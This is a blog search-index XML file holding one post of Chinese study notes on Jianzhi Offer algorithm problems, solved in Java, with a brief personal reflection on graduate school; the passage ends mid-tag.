<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>剑指offer第二版</title>
      <link href="/2023/03/20/%E5%89%91%E6%8C%87offer%E7%AC%AC%E4%BA%8C%E7%89%88/"/>
      <url>/2023/03/20/%E5%89%91%E6%8C%87offer%E7%AC%AC%E4%BA%8C%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h1 id="剑指Offer-第二版-刷题笔记"><a href="#剑指Offer-第二版-刷题笔记" class="headerlink" title="剑指Offer(第二版)刷题笔记"></a>剑指Offer(第二版)刷题笔记</h1><h2 id="03、数组中重复的数字（12月22日）"><a href="#03、数组中重复的数字（12月22日）" class="headerlink" title="03、数组中重复的数字（12月22日）"></a>03、数组中重复的数字（12月22日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法<span class="number">1</span>，排序。做一个pre指针初始为-<span class="number">1</span>，将nums排好序后从左向右遍历，如果当前num等于pre则返回num，否则将pre指向num。</span><br><span class="line"><span class="number">2.</span>我的想法<span class="number">2</span>，hashSet。维护hashSet，从左到右遍历nums，如果当前num在hashSet已经存在就返回num，否则将当前num加入hashSet。</span><br><span class="line"><span class="number">3.</span>没有别的想法，就是想简单题重拳出击！</span><br></pre></td></tr></table></figure><h2 id="04、二维数组中的查找（240、12月22日）"><a href="#04、二维数组中的查找（240、12月22日）" class="headerlink" title="04、二维数组中的查找（240、12月22日）"></a>04、二维数组中的查找（240、12月22日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二分查找。这道题比较简单，是经典的二分查找模板题。首先要在二维数组中选取指定行，选取行的过程不需要二分查找，只要row[<span class="number">0</span>]&lt;=target，就对该行再进行二分查找。</span><br></pre></td></tr></table></figure><h2 id="06、从尾到头打印链表（12月23日）"><a href="#06、从尾到头打印链表（12月23日）" class="headerlink" title="06、从尾到头打印链表（12月23日）"></a>06、从尾到头打印链表（12月23日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈。注意不可<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;stack.size();i++)，这样<span class="keyword">for</span>循环内部出栈后，stack.size()每次都会改变。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，递归实现。维护类变量List&lt;Integer&gt; tmp，实现辅助函数 recur(ListNode node)，该辅助函数递归调用recur(node.next)，递归返回时，将node.val加入tmp。从这也可看到，递归本质就是一种栈，实现了先入后出。</span><br></pre></td></tr></table></figure><h2 id="07、重建二叉树（12月24日）"><a href="#07、重建二叉树（12月24日）" class="headerlink" title="07、重建二叉树（12月24日）"></a>07、重建二叉树（12月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，根节点关系公式。这道题很特殊，只要记得前序是中左右，[num,[左子树]，[右子树]]；中序是左中右，[[左子树],num,[右子树]]，根据num的位置关系即可确定左右子树。</span><br><span class="line">    实现思路是，先将inorder按&lt;num,索引&gt;放入hashMap，查看preorder[preorderLeft]在hashMap中的索引值，通过inorder计算出左子树的长度，将root节点值设为preorderLeft索引对应的值，并递归构建左右子树：</span><br><span class="line">    root.left = myBuildTree(...)</span><br><span class="line"><span class="number">2.</span>实际上，inorder的作用一直是辅助计算左子树长度，还是以preorder为主。</span><br></pre></td></tr></table></figure><h2 id="08、用两个栈实现队列（12月24日）"><a href="#08、用两个栈实现队列（12月24日）" class="headerlink" title="08、用两个栈实现队列（12月24日）"></a>08、用两个栈实现队列（12月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，来回倒腾。维护两个Stack&lt;Integer&gt;，分别是stackMain和stackTmp，appendTail时，直接将num压入stackMain。</span><br><span class="line">deleteHead执行时，先判断stackMain如果为空，则直接返回-<span class="number">1</span>，表示没有元素；如果不为空，就将stackMain元素依次出栈，压入stackTmp；弹栈取出stackTmp栈顶值时，再依次压入stackMain。（不规定main和tmp，可能会提高效率）</span><br><span class="line"><span class="number">2.</span>注意，用Deque实现栈时，pop和remove都是操作队列首部，并不是弹栈，removeLast才是弹栈。Stack完全遵守栈逻辑。</span><br></pre></td></tr></table></figure><h2 id="10-Ⅰ、斐波那契数列（12月24日）"><a href="#10-Ⅰ、斐波那契数列（12月24日）" class="headerlink" title="10-Ⅰ、斐波那契数列（12月24日）"></a>10-Ⅰ、斐波那契数列（12月24日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。维护三个<span class="type">int</span>变量p、q和r，其中p代表f(n-<span class="number">2</span>)，q代表f(n-<span class="number">1</span>)，r代表f(n)，每次计算时，p = q、q = r，新r通过(p+q)%<span class="number">1000000007</span>求得。这样就实现了滚动数组。</span><br><span class="line"><span class="number">2.</span>我的想法，递归。递归出现重复计算，很容易超时，需要维护数组，为每个n保存初始值为-<span class="number">1</span>，只有不是-<span class="number">1</span>才递归计算f(n)。</span><br><span class="line">    Arrays.fill(results,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h2 id="10-Ⅱ、青蛙跳台阶问题（12月25日）"><a href="#10-Ⅱ、青蛙跳台阶问题（12月25日）" class="headerlink" title="10-Ⅱ、青蛙跳台阶问题（12月25日）"></a>10-Ⅱ、青蛙跳台阶问题（12月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。这道题就是上楼梯问题，设dp[i]表示上第i阶楼梯有多少种上法，则状态转移方程：</span><br><span class="line">    dp[i] = (dp[i-<span class="number">1</span>]+dp[i-<span class="number">2</span>])%<span class="number">1000000007</span>;</span><br></pre></td></tr></table></figure><h2 id="11、旋转数组的最小数字（154、12月25日）"><a href="#11、旋转数组的最小数字（154、12月25日）" class="headerlink" title="11、旋转数组的最小数字（154、12月25日）"></a>11、旋转数组的最小数字（154、12月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，<span class="keyword">for</span>遍历。从左到右遍历，找到比前面一位小的nums[i]，否则返回nums[<span class="number">0</span>]。</span><br></pre></td></tr></table></figure><h2 id="12、矩阵中的路径（79、12月25日）"><a href="#12、矩阵中的路径（79、12月25日）" class="headerlink" title="12、矩阵中的路径（79、12月25日）"></a>12、矩阵中的路径（79、12月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，图BFS。总觉得做过，但翻笔记又没找到。看题目，能感觉到visited数组是需要变化的，某条路径可能访问过该点，不构成word，但其他路径可能需要该点。本题题解的关键，在于图BFS时回溯的思想，先将visited[i][j]置为<span class="literal">true</span>，递归执行BFS后，再将visited[i][j]置为<span class="literal">false</span>，表示消除这条路径的影响。</span><br></pre></td></tr></table></figure><h2 id="14-Ⅰ、剪绳子（343、12月25日）"><a href="#14-Ⅰ、剪绳子（343、12月25日）" class="headerlink" title="14-Ⅰ、剪绳子（343、12月25日）"></a>14-Ⅰ、剪绳子（343、12月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。每次看到题解都惊为天人。设dp[i]表示将正整数拆分成至少两个整数后，这些整数的最大乘积。状态转移方程如下，表示每次拆解i的话，都必须拆解为至少<span class="number">2</span>块，要不然至此结束j*(i-j)，要不然继续拆解j*dp[i-j]。</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Math.max(j*(i-j),j*dp[i-j]);</span><br><span class="line">当然，这只是按j拆解的结果，还需要更新最终结果dp[i] = Math.max(dp[i],result)。</span><br></pre></td></tr></table></figure><h2 id="14-Ⅱ、剪绳子Ⅱ（343、12月25日）"><a href="#14-Ⅱ、剪绳子Ⅱ（343、12月25日）" class="headerlink" title="14-Ⅱ、剪绳子Ⅱ（343、12月25日）"></a>14-Ⅱ、剪绳子Ⅱ（343、12月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，大数运算+动态规划。这道题和剪绳子Ⅰ不同在，结果需要模<span class="number">1e9</span>+<span class="number">7</span>，dp[i]累积乘起来的话，n等于<span class="number">120</span>时就会溢出。此时需要<span class="keyword">import</span> java.math.BigInteger，进行大数运算，基本逻辑一致，只需返回时取模。其他题解都是数学方法，还是不再看了。</span><br><span class="line"><span class="number">2.</span>大数运算<span class="keyword">import</span> java.math.BigInteger</span><br><span class="line">BigInteger dp[] = <span class="keyword">new</span> <span class="title class_">BigInteger</span>[n + <span class="number">1</span>];  <span class="comment">//定义数组</span></span><br><span class="line">Arrays.fill(dp, BigInteger.valueOf(<span class="number">1</span>));   <span class="comment">//赋值</span></span><br><span class="line">dp[i - j].multiply(BigInteger.valueOf(j)) <span class="comment">//相乘</span></span><br><span class="line">dp[i].max(result)<span class="comment">//取最大值，其中dp[i]和result均为BigInteger</span></span><br><span class="line">dp[n].mod(BigInteger.valueOf(<span class="number">1000000007</span>)).intValue();<span class="comment">//取模，并恢复成int类型</span></span><br></pre></td></tr></table></figure><h2 id="15、二进制中1的个数（191、12月26日）"><a href="#15、二进制中1的个数（191、12月26日）" class="headerlink" title="15、二进制中1的个数（191、12月26日）"></a>15、二进制中1的个数（191、12月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，位运算。求<span class="type">int</span>型整数中<span class="number">1</span>的个数，只需遍历该整数的<span class="number">32</span>位，在每一位上与<span class="number">1</span>相与，并累加结果。当然也可(<span class="number">1</span> &lt;&lt; i)。</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) result += (n&gt;&gt;i)&amp;<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="16、数值的整数次方（50、12月26日）"><a href="#16、数值的整数次方（50、12月26日）" class="headerlink" title="16、数值的整数次方（50、12月26日）"></a>16、数值的整数次方（50、12月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，快速幂+递归。如果要计算x^<span class="number">64</span>，从x，x^<span class="number">2</span>，x^<span class="number">3</span>累积是不理智的，应该计算x^<span class="number">2</span>，x^<span class="number">4</span>，x^<span class="number">8</span>，x^<span class="number">16</span>，x^<span class="number">32</span>，x^<span class="number">64</span>。那如果是x^<span class="number">65</span>呢？就需要x^<span class="number">64</span>*x，就需要判断按幂数a%<span class="number">2</span>分情况讨论。这种关系能通过递归实现： <span class="type">double</span> <span class="variable">y</span> <span class="operator">=</span> quickMul(x,a/<span class="number">2</span>); y*y or y*y*x。</span><br></pre></td></tr></table></figure><h2 id="17、打印从1到最大的n位数（12月26日）"><a href="#17、打印从1到最大的n位数（12月26日）" class="headerlink" title="17、打印从1到最大的n位数（12月26日）"></a>17、打印从1到最大的n位数（12月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，幂运算。这道题难道是看不起我，用幂运算即可，需注意Math.pow返回<span class="type">double</span>，数字从<span class="number">1</span>开始。</span><br><span class="line"><span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (<span class="type">int</span>) Math.pow(<span class="number">10</span>,n);</span><br><span class="line"><span class="number">2.</span>看题解要考虑大数，看来需要对大数运算、去除前导<span class="number">0</span>等总结一哈。</span><br></pre></td></tr></table></figure><h2 id="18、删除链表的节点（12月26日）"><a href="#18、删除链表的节点（12月26日）" class="headerlink" title="18、删除链表的节点（12月26日）"></a>18、删除链表的节点（12月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双指针。维护prev初始为<span class="literal">null</span>、tmp初始为head，通过tmp遍历链表，交替更新。特殊情况是，head.val==val，直接返回head.next即可。</span><br></pre></td></tr></table></figure><h2 id="21、调整数组顺序使奇数位于偶数前面（12月27日）"><a href="#21、调整数组顺序使奇数位于偶数前面（12月27日）" class="headerlink" title="21、调整数组顺序使奇数位于偶数前面（12月27日）"></a>21、调整数组顺序使奇数位于偶数前面（12月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双指针。维护奇数指针pointOdd初始化为<span class="number">0</span>，偶数指针pointEven初始化为nums.length-<span class="number">1</span>，当pointOdd指向的num为偶数时，就与pointEven指向元素交换位置，并将pointEven减一；当pointOdd指向的num为奇数时，将pointOdd加一。</span><br><span class="line">    当然，可以通过压缩pointEven指针位置优化执行速度。</span><br></pre></td></tr></table></figure><h2 id="22、链表中倒数第k个节点（12月27日）"><a href="#22、链表中倒数第k个节点（12月27日）" class="headerlink" title="22、链表中倒数第k个节点（12月27日）"></a>22、链表中倒数第k个节点（12月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针。维护指针first、second，让first指针先走k步，然后两指针并行，直到first指针走到链表尾，此时second指针指向倒数第k个节点。</span><br></pre></td></tr></table></figure><h2 id="24、反转链表（206、12月27日）"><a href="#24、反转链表（206、12月27日）" class="headerlink" title="24、反转链表（206、12月27日）"></a>24、反转链表（206、12月27日）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法，三指针。反转链表，只要记得维护3个指针即可，prev初始为0，tmp初始为head，tmpNext在遍历中存储tmp.next。</span><br></pre></td></tr></table></figure><h2 id="25、合并两个排序链表（21、12月27日）"><a href="#25、合并两个排序链表（21、12月27日）" class="headerlink" title="25、合并两个排序链表（21、12月27日）"></a>25、合并两个排序链表（21、12月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，dummy节点。初始dummy节点为<span class="keyword">new</span> <span class="title class_">ListNode</span>()，head指针指向dummy节点。通过<span class="keyword">while</span>(l1!=<span class="literal">null</span>&amp;&amp;l2!=<span class="literal">null</span>)遍历连个链表，跳出循环说明l1和l2至少有<span class="number">1</span>个，指向<span class="literal">null</span>，连接非<span class="literal">null</span>节点即可。</span><br></pre></td></tr></table></figure><h2 id="26、树的子结构（12月27日）"><a href="#26、树的子结构（12月27日）" class="headerlink" title="26、树的子结构（12月27日）"></a>26、树的子结构（12月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归。首先先序遍历二叉树A，对二叉树A的每个节点，判断以该节点为根的子树，是否和B子树相等。这道题递归很巧妙，先序遍历是这样设计的：</span><br><span class="line">    dfs(A,B)||isSubStructure(A.left,B)||isSubStructure(A.right,B)</span><br><span class="line">递归时，如果B子树的节点为<span class="literal">null</span>，说明能匹配到最后，返回<span class="literal">true</span>；当B节点不为<span class="literal">null</span>，A节点为<span class="literal">null</span>或不相等，说明子树不匹配；相等，则继续dfs递归A和B相同方向的子树。</span><br></pre></td></tr></table></figure><h2 id="27、二叉树的镜像（226、12月28日）"><a href="#27、二叉树的镜像（226、12月28日）" class="headerlink" title="27、二叉树的镜像（226、12月28日）"></a>27、二叉树的镜像（226、12月28日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归。这道题以前好像做过，但还是觉得拿不下来。记住后序遍历递归就好了。先对root的左、右子树进行递归反转，再将root的左、右子节点交换位置。（关键词、后序遍历递归）</span><br></pre></td></tr></table></figure><h2 id="28、对称的二叉树（101、12月28日）"><a href="#28、对称的二叉树（101、12月28日）" class="headerlink" title="28、对称的二叉树（101、12月28日）"></a>28、对称的二叉树（101、12月28日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归。这道题也还是不会。设计递归函数时，考虑比较传入的左、右子节点的值，比较左子节点的right和右子节点的left，再比较左子节点的left和右子节点的right，做这<span class="number">3</span>种比较。</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isDuiCheng</span><span class="params">(TreeNode leftRoot,TreeNode rightRoot)</span></span><br><span class="line">边界值，如果leftRoot和rightRoot都为<span class="literal">null</span>，返回<span class="literal">true</span>，说明该路径比较结束；否则，有一个不为<span class="literal">null</span>，则不对称。</span><br><span class="line">（关键词，dfs做<span class="number">3</span>种比较）</span><br></pre></td></tr></table></figure><h2 id="29、顺时针打印矩阵（54、12月28日）"><a href="#29、顺时针打印矩阵（54、12月28日）" class="headerlink" title="29、顺时针打印矩阵（54、12月28日）"></a>29、顺时针打印矩阵（54、12月28日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，图BFS。这道题的意思是，在数组中按顺时针螺旋获取元素。题解为，首先计算元素个数total，维护<span class="type">int</span>型数组result和<span class="type">boolean</span>型数组visit，规定方向顺序为（右，下，左，上）。按<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;total;i++)获取数组元素，再按方向顺序确定新元素的位置。</span><br><span class="line"><span class="number">2.</span>但是，我做题时是用<span class="keyword">for</span> <span class="keyword">break</span>方式确定新元素，这会造成在向上时，只能向上一个单元（只会在向上发生）。题解的解决办法是，维护<span class="keyword">for</span>循环外变量directionIndex ，保留住方向的惯性。出现不满足的情况，才会</span><br><span class="line">    directionIndex = (directionIndex + <span class="number">1</span>) % <span class="number">4</span>;   <span class="comment">//换下一个方向，新位置必然合法</span></span><br></pre></td></tr></table></figure><h2 id="30、包含min函数的栈（155、12月28日）"><a href="#30、包含min函数的栈（155、12月28日）" class="headerlink" title="30、包含min函数的栈（155、12月28日）"></a>30、包含min函数的栈（155、12月28日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双栈。维护两个栈mainStack和minStack，每当在mainStack压入元素时，同步在minStack压入当前最小元素。弹栈也同步。min函数会获取minStack栈顶元素。</span><br><span class="line"><span class="number">2.</span>其实，可以预先在minStack压栈Integer.MAX_VALUE，这样代码会更优雅，不会存在空栈判断。</span><br></pre></td></tr></table></figure><h2 id="31、栈的压入、弹出序列（946、12月29日）"><a href="#31、栈的压入、弹出序列（946、12月29日）" class="headerlink" title="31、栈的压入、弹出序列（946、12月29日）"></a>31、栈的压入、弹出序列（946、12月29日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，辅助栈。维护一个辅助栈stack，通过压栈序列在stack上模拟压栈过程，当栈顶和弹栈序列当前位置元素相等时，就对stack弹栈，并将弹栈序列位置加一。当弹栈序列错误时，一些元素被栈顶压着形成死锁，最终栈不为空。</span><br></pre></td></tr></table></figure><h2 id="32、从上到下打印二叉树（12月29日）"><a href="#32、从上到下打印二叉树（12月29日）" class="headerlink" title="32、从上到下打印二叉树（12月29日）"></a>32、从上到下打印二叉树（12月29日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，层序遍历二叉树。这道题没要求区分层次，只要求从左到右打印。所以，只需要维护队列deque，不需要维护每层长度dequeLen，当队列不为空时，弹出队首元素，如果该元素不为<span class="literal">null</span>，则把val放入结果，把左右子节点放入deque。</span><br></pre></td></tr></table></figure><h2 id="32-Ⅱ、从上到下打印二叉树Ⅱ（12月29日）"><a href="#32-Ⅱ、从上到下打印二叉树Ⅱ（12月29日）" class="headerlink" title="32-Ⅱ、从上到下打印二叉树Ⅱ（12月29日）"></a>32-Ⅱ、从上到下打印二叉树Ⅱ（12月29日）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法，层序遍历二叉树。这道题区分层次，需要维护队列deque和每层长度dequeLen，我的解法不变，需要判断满足dequeLen为0时，将当前层元素集合result放入结果集，并重置dequeLen和result。</span><br></pre></td></tr></table></figure><h2 id="32-Ⅲ、从上到下打印二叉树Ⅲ（12月29日）"><a href="#32-Ⅲ、从上到下打印二叉树Ⅲ（12月29日）" class="headerlink" title="32-Ⅲ、从上到下打印二叉树Ⅲ（12月29日）"></a>32-Ⅲ、从上到下打印二叉树Ⅲ（12月29日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，层序遍历二叉树。这道题需要交替方向，打印不同层次。题解中巧妙点在于，当前层元素集合result不再是list，而是deque，灵活地选择在队列头部或尾部插入元素，可以造成从左到右或从右到左打印的效果，最后再将deque按内容转换为list。</span><br><span class="line">Deque&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">...</span><br><span class="line"><span class="comment">//假如该层有元素[1,2,3]，已经插入元素1，此时要插入元素2</span></span><br><span class="line">result.addLast(tmp.val);<span class="comment">//addLast是默认操作，会在队列尾部插入元素，队列变成[1,2]</span></span><br><span class="line">result.addFirst(tmp.val);<span class="comment">//addFirst会在队列头部插入元素，即1以前，队列变成[2,1]</span></span><br><span class="line">...</span><br><span class="line">results.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(result));</span><br></pre></td></tr></table></figure><h2 id="33、二叉搜索树的后序遍历序列（12月30日）"><a href="#33、二叉搜索树的后序遍历序列（12月30日）" class="headerlink" title="33、二叉搜索树的后序遍历序列（12月30日）"></a>33、二叉搜索树的后序遍历序列（12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，分治法。二叉搜索树，左子树中所有节点的值都小于本根节点，右子树中所有节点的值都大于本根节点，由于是后序遍历，本根节点在序列的最后一位。那么，就检测左右子树是否满足该性质，并记录右子树的开始位置（第一个大于序列最后一位的元素位置），并再递归到左子树、右子树继续判断。</span><br><span class="line">边界条件是，当dfs某子树时，left&gt;=right，说明不存在该子树，或只有<span class="number">1</span>位，此时返回<span class="literal">true</span>。</span><br></pre></td></tr></table></figure><h2 id="34、二叉树中和为某一值的路径（113、12月30日）"><a href="#34、二叉树中和为某一值的路径（113、12月30日）" class="headerlink" title="34、二叉树中和为某一值的路径（113、12月30日）"></a>34、二叉树中和为某一值的路径（113、12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。经典的模板题，注意一点即可：题目中定义叶子节点，是没有子节点的节点，路径以叶子节点结束。</span><br></pre></td></tr></table></figure><h2 id="35、复杂链表的复制（138、12月30日）"><a href="#35、复杂链表的复制（138、12月30日）" class="headerlink" title="35、复杂链表的复制（138、12月30日）"></a>35、复杂链表的复制（138、12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归+hashMap。这道题要打破思路，不要想着按next顺序一个接着一个，而是要递归。建立新链表的难点是，random指针指向的新节点，有可能还没有建立，所以需要hashMap建立联系。</span><br><span class="line">    dfs的逻辑是，如果node（原链）还没有缓存在hashMap，就新建newNode，将映射关系&lt;node,newNode&gt;放在hashMap，并递归建立newNode的left指针和random指针指向的节点。（关键词，不按next按递归）</span><br></pre></td></tr></table></figure><h2 id="36、二叉搜索树与双向链表（426、12月30日）"><a href="#36、二叉搜索树与双向链表（426、12月30日）" class="headerlink" title="*36、二叉搜索树与双向链表（426、12月30日）"></a>*36、二叉搜索树与双向链表（426、12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，中序遍历。我的思路，递归函数返回右子节点，首次遍历到左、右子节点均为<span class="literal">null</span>的节点时，将其设置为head。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，中序遍历。其实和我思路类似，它维护了类变量指针pre、head，pre指向最后操作的root节点。MD，还是有点难，很难描述，下次再说。真的不知道为啥类变量不初始为<span class="literal">null</span>、函数传参初始为<span class="literal">null</span>会有差别？？？</span><br></pre></td></tr></table></figure><h2 id="38、字符串的排列（12月30日）"><a href="#38、字符串的排列（12月30日）" class="headerlink" title="38、字符串的排列（12月30日）"></a>38、字符串的排列（12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯。这道题知道用递归，但是递归过程中哪些数字已经被访问，出现重复数字怎么办，这些没有一下想到解决方案。本题解的思路是，维护visited数组表示是否访问过该数，通过排序避免重复数字造成重复序列。巧妙点如下，只取相同数字的第一个保证了不重复：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="comment">//如果访问过该数字，则不再访问</span></span><br><span class="line">        <span class="comment">//如果该数字不是相同数字序列的第一个，则不再访问</span></span><br><span class="line">    <span class="keyword">if</span>(visited[j]||(j&gt;<span class="number">0</span>&amp;&amp;!visited[j-<span class="number">1</span>]&amp;&amp;arrs[j-<span class="number">1</span>]==arrs[j]))</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="39、数组中出现次数超过一半的数字（169、12月30日）"><a href="#39、数组中出现次数超过一半的数字（169、12月30日）" class="headerlink" title="39、数组中出现次数超过一半的数字（169、12月30日）"></a>39、数组中出现次数超过一半的数字（169、12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，排序后取中间。我的思路<span class="number">1</span>，hashMap统计次数。</span><br><span class="line"><span class="number">2.</span>这道题还要求，在空间复杂度为O(<span class="number">1</span>)、时间复杂度很低情况下完成，现在先不考虑。</span><br></pre></td></tr></table></figure><h2 id="42、连续子数组的最大和（53、12月30日）"><a href="#42、连续子数组的最大和（53、12月30日）" class="headerlink" title="42、连续子数组的最大和（53、12月30日）"></a>42、连续子数组的最大和（53、12月30日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，动态规划。本来想用古老的滑动窗口，发现复杂度O(n)遂放弃。用动态规划的话，dp[i]表示以nums[i]结尾的数组和的最大值，维护result，在求dp[i]后不断更新result，就能得到所有子数组的最大情况。</span><br></pre></td></tr></table></figure><h2 id="46、把数字翻译成字符串（12月31日）"><a href="#46、把数字翻译成字符串（12月31日）" class="headerlink" title="46、把数字翻译成字符串（12月31日）"></a>46、把数字翻译成字符串（12月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。定义dp[i]表示以第i位字符结束的数字，该数字有dp[i]种翻译方式。状态转移方程，需要考虑两方面：</span><br><span class="line">a.当第i-<span class="number">1</span>位字符和第i位字符组成的数字，不在[<span class="number">10</span>,<span class="number">25</span>]范围里，不是合法英文字母，此时dp[i]=dp[i-<span class="number">1</span>];</span><br><span class="line">b.在[<span class="number">10</span>,<span class="number">25</span>]范围里，dp[i]=dp[i-<span class="number">1</span>]+dp[i-<span class="number">2</span>]，表示翻译方式来源于单独翻译nums[i]，还是合体翻译两位数；</span><br><span class="line">实现以上思路时，由于转移方程存在dp[i-<span class="number">2</span>]，我根据经验定义dp[[src.length()+<span class="number">1</span>]]，平移避免初始化。</span><br><span class="line"><span class="number">2.</span>字符串和整数比较方法：</span><br><span class="line"><span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> src.substring(i-<span class="number">1</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(tmp.compareTo(<span class="string">&quot;25&quot;</span>)&lt;=<span class="number">0</span>)<span class="comment">//判断字符串是否小于等于25</span></span><br></pre></td></tr></table></figure><h2 id="47、礼物的最大价值（12月31日）"><a href="#47、礼物的最大价值（12月31日）" class="headerlink" title="47、礼物的最大价值（12月31日）"></a>47、礼物的最大价值（12月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的思路，动态规划。这是路径和、路径数目的经典模板题，设dp[i][j]表示以(i,j)结尾的最大礼物价值，则转移方程为：</span><br><span class="line">    dp[i][j] = Math.max(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>])+grid[i][j];</span><br><span class="line">此外，需要注意初始化最左边一列、以及最上边一行。</span><br></pre></td></tr></table></figure><h2 id="37、序列化二叉树（297、12月31日）"><a href="#37、序列化二叉树（297、12月31日）" class="headerlink" title="37、序列化二叉树（297、12月31日）"></a>37、序列化二叉树（297、12月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>想一想研究生生涯就是从序列化开始的，<span class="number">2022</span>年的最后一天恰好碰到这道困难题，正好同时翻越<span class="number">250</span>题的门槛，有点天命的味道。从最开始跟着cmz师兄贪婪学习的小学弟，到后来目睹zlw师兄这届痛苦的秋招历程，在技术上迷茫，在研究里打旋，至今反而愈发看开，人生大抵如此，有些事儿拼完全力也未必能行，有些时候不撞南墙是不会回头。我感受到阳光和勇气在流失，感受到纸盒子扣在我的生活里，万幸有波吉的陪伴，让我在这段时光里没有轻言放弃，看到生活中剥离技术后的温暖瞬间。说实话，真的想留在<span class="number">2022</span>年，这时候大家都在我的身边。fighting阿琨！</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>我的想法，队列实现层序遍历二叉树。想法很简单，第二次还是做出来了，最开始还以为有双向链表，结果是LRU那道题。思路是，在序列化二叉树时，序列化为“<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,”，即转换成满二叉树；在反序列化时，同样用deque实现层序遍历，如果!arrs[i].equals(<span class="string">&quot;null&quot;</span>)，将新节点连接到deque弹出的节点上，并将新节点放入队列。</span><br><span class="line"><span 